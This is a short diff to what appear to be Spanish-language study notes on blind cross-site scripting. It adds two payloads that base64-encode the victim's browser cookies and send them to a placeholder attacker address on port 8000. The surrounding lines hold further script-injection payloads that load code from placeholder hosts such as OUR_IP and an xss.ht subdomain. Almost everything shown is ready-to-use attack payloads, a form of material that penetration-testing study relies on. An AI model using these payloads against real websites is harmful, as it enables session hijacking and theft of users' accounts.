@@ -147,6 +147,8 @@ Se puede dar mediante el uso de:
 -> HTTP User-Agent header
 En todos los casos anteioes se da la particularidad de que no tenemos acceso para saber de forma concreta como se maneja nuestro input y tampoco tenemos acceso a poder probar con alerts, etc.
 
+<h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>
+<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>
 <script src=http://OUR_IP/<custom.name>></script>
 "><script src="https://<OUR_I P>/<custom.name>"></script>
 "><script src=//<custom.subdomain>.xss.ht></script>
